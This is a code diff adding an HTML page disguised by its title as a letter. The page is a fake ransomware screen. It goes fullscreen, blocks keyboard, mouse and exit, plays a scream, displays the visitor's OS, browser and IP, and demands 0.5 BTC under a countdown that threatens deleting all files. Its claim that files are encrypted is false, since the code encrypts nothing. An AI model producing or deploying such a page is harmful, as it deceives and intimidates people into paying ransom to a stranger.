@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LETTER-FOR-YOU</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: black;
+            color: red;
+            text-align: center;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+        }
+        .container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80%;
+        }
+        .title {
+            font-size: 40px;
+            font-weight: bold;
+        }
+        .message {
+            font-size: 20px;
+            margin-top: 10px;
+        }
+        .countdown {
+            font-size: 30px;
+            font-weight: bold;
+            margin-top: 20px;
+            color: yellow;
+        }
+        .decrypt-btn {
+            margin-top: 20px;
+            padding: 10px 20px;
+            font-size: 18px;
+            border: none;
+            cursor: pointer;
+            background: white;
+            color: black;
+            font-weight: bold;
+            border-radius: 5px;
+        }
+        .decrypt-btn:hover {
+            background: gray;
+        }
+        .btc-address {
+            margin-top: 15px;
+            font-size: 18px;
+            font-weight: bold;
+            color: white;
+            background: #222;
+            display: inline-block;
+            padding: 10px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body oncontextmenu="return false" onkeydown="return false" onmousedown="return false">
+
+    <div class="container">
+        <div class="title">YOUR FILES ARE ENCRYPTED</div>
+        <div class="message">Your personal data has been locked! Pay 0.5 BTC to unlock.</div>
+        <div class="message" id="userInfo">Detecting user information...</div>
+        <div class="countdown">Time Left: <span id="timer">3d 00h:00m:00s</span></div>
+        <button class="decrypt-btn" onclick="decryptFiles()">DECRYPT FILES</button>
+        <div class="btc-address" onclick="copyBTC()">BTC Wallet: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</div>
+    </div>
+
+    <audio id="scarySound" src="https://www.myinstants.com/media/sounds/scream.mp3"></audio>
+
+    <script>
+        let confirmOpen = confirm("Are you sure you want to open this file?");
+        
+        if (confirmOpen) {
+            alert("This file is running in the background...");
+            document.body.requestFullscreen();
+            startTimer();
+            playScarySound();
+            disableExit();
+            detectUserInfo();
+        } else {
+            document.body.innerHTML = "<h1 style='color:green;'>File opening canceled.</h1>";
+        }
+
+        function playScarySound() {
+            let sound = document.getElementById("scarySound");
+            sound.play();
+        }
+
+        function disableExit() {
+            document.addEventListener("keydown", function(event) {
+                event.preventDefault();
+            });
+            window.addEventListener("beforeunload", function(event) {
+                event.preventDefault();
+                event.returnValue = "";
+            });
+        }
+
+        let time = 3 * 24 * 60 * 60; // 3 days = 259200 seconds
+
+        function startTimer() {
+            function updateTimer() {
+                let days = Math.floor(time / (24 * 60 * 60));
+                let hours = Math.floor((time % (24 * 60 * 60)) / (60 * 60));
+                let minutes = Math.floor((time % (60 * 60)) / 60);
+                let seconds = time % 60;
+
+                document.getElementById("timer").innerText =
+                    (days > 0 ? days + "d " : "") +
+                    (hours < 10 ? "0" : "") + hours + "h:" +
+                    (minutes < 10 ? "0" : "") + minutes + "m:" +
+                    (seconds < 10 ? "0" : "") + seconds + "s";
+
+                if (time === 3600) {
+                    document.body.style.background = "red"; // Change background to red at 1 hour left
+                }
+
+                time--;
+                if (time < 0) {
+                    document.body.innerHTML = "<h1 style='color:red;'>ALL FILES DELETED!</h1>";
+                }
+            }
+            setInterval(updateTimer, 1000);
+        }
+
+        function decryptFiles() {
+            alert("ERROR: Payment Required. Unable to decrypt files.");
+        }
+
+        function copyBTC() {
+            let btcAddress = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa";
+            navigator.clipboard.writeText(btcAddress);
+            alert("BTC Wallet copied to clipboard!");
+        }
+
+        function detectUserInfo() {
+            function getOS() {
+                let userAgent = navigator.userAgent;
+                if (userAgent.includes("Win")) return "Windows";
+                if (userAgent.includes("Mac")) return "MacOS";
+                if (userAgent.includes("Linux")) return "Linux";
+                if (userAgent.includes("Android")) return "Android";
+                if (userAgent.includes("iPhone") || userAgent.includes("iPad")) return "iOS";
+                return "Unknown";
+            }
+
+            function getBrowser() {
+                let userAgent = navigator.userAgent;
+                if (userAgent.includes("Chrome")) return "Google Chrome";
+                if (userAgent.includes("Firefox")) return "Mozilla Firefox";
+                if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) return "Safari";
+                if (userAgent.includes("Edge")) return "Microsoft Edge";
+                if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
+                return "Unknown";
+            }
+
+            function getDeviceType() {
+                return /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
+            }
+
+            function getIPAddress() {
+                fetch("https://api64.ipify.org?format=json")
+                    .then(response => response.json())
+                    .then(data => {
+                        let userInfo = `We have detected you are using <strong>${getOS()}</strong> with <strong>${getBrowser()}</strong> on a <strong>${getDeviceType()}</strong>. Your IP address is <strong>${data.ip}</strong>.`;
+                        document.getElementById("userInfo").innerHTML = userInfo;
+                    })
+                    .catch(() => {
+                        document.getElementById("userInfo").innerHTML = "User detection failed.";
+                    });
+            }
+
+            getIPAddress();
+        }
+    </script>
+
+</body>
+</html>
